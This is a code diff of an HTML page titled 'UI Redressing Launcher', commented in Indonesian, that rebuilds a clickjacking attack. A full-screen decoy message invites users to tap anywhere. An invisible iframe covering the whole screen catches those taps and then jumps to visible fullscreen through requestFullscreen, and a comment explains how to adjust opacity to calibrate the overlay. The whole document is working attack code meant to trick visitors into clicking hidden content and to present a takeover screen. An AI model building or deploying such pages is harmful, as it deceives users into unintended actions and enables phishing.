@@ -3,61 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UI Redressing Launcher - Fixed</title>
+    <title>UI Redressing Launcher - Click Anywhere</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        /* 1. Paksa body mengisi seluruh layar tanpa scrollbar */
+        body, html {
             margin: 0;
-            background: #f0f0f0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
         }
+
+        /* 2. PERUBAHAN UTAMA: Kontainer jebakan memenuhi seluruh layar */
         .container {
             position: relative;
-            width: 250px;
-            height: 55px;
+            width: 100vw;
+            height: 100vh;
+            background: #f0f0f0;
         }
-        /* Tombol jebakan visual */
-        .base-button {
+
+        /* Umpan visual agar pengguna merasa perlu mengklik halaman */
+        .decoy-background {
             position: absolute;
             width: 100%;
             height: 100%;
-            background: #e03131;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             z-index: 1;
+            background-color: #f8f9fa;
+        }
+
+        .decoy-text {
+            padding: 20px 40px;
+            background: #1a73e8;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
         }
         
-        /* Iframe transparan awal */
+        /* 3. Iframe transparan yang menutupi seluruh layar sejak awal */
         .overlay-frame {
             position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100vw !important;
+            height: 100vh !important;
             border: none;
             z-index: 2;
-            opacity: 0.0; /* Ubah ke 0.4 jika ingin mempermudah kalibrasi posisi */
+            opacity: 0.0; /* Ubah ke 0.3 untuk kalibrasi/melihat area cakupan hijau iframe */
         }
 
-        /* PERBAIKAN UTAMA:
-          Ketika iframe ini naik ke Top Layer via requestFullscreen,
-          paksa ukurannya untuk memenuhi seluruh layar browser, bukan hanya 250x55px.
-        */
+        /* Ketika iframe masuk ke Top Layer via requestFullscreen */
         .overlay-frame:fullscreen {
             width: 100vw !important;
             height: 100vh !important;
-            opacity: 1.0 !important; /* Kembalikan opasitas menjadi terlihat penuh */
+            opacity: 1.0 !important; /* Buat isi server langsung terlihat penuh */
             background-color: #ffffff !important;
         }
         
-        /* Dukungan untuk engine berbasis WebKit (Safari / iOS WebView) */
+        /* Dukungan WebKit engine (Safari / iOS WebView) */
         .overlay-frame:-webkit-full-screen {
             width: 100vw !important;
             height: 100vh !important;
@@ -69,7 +78,14 @@
 <body>
 
 <div class="container">
-    <button class="base-button">Klik untuk Masuk</button>
+    <div class="decoy-background">
+        <div class="decoy-text">
+            Ketuk Di Mana Saja untuk Melanjutkan
+            <div style="font-size: 12px; font-weight: normal; margin-top: 5px; color: #e8f0fe;">
+                (Membutuhkan otentikasi layar)
+            </div>
+        </div>
+    </div>
     
     <iframe 
         class="overlay-frame" 
